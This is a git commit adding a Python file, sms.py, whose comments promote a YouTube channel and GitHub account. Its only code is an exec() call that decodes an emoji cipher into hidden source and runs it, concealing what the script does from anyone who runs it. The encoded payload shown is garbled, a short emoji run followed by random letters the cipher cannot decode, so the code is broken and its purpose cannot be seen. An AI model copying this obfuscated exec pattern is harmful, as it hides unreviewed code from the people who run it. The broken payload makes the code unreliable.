87a3684f870bf1451b5e023bf5524ce8f7faf4ba
©Botz GexusR <99302576+BotzwhatsApp@users.noreply.github.com>
2022-05-05 06:44:11 +0700

    Add files via upload

---
+++ sms.py
@@ -0,0 +1,7 @@
+# pp by AmmarBN
+# Jangan lupa subscribe Youtube Ammar Executed
+# Github- https://github.com/Lord-Ammar
+exec("".join(map(chr,[int("".join(str({'😀': 0, '😁': 3, '😂': 6, '😃': 1, '😄': 2, '😅': 4, '😉': 7, '😊': 8, '😛': 9, '🤣': 5}[i]) for i in x.split())) for x in
+😄😁🤣😂😛😃😉
+yoyoyoyotojfnfnfmfmdmdmkeejgdjsjdhds
+.split("  ")])))
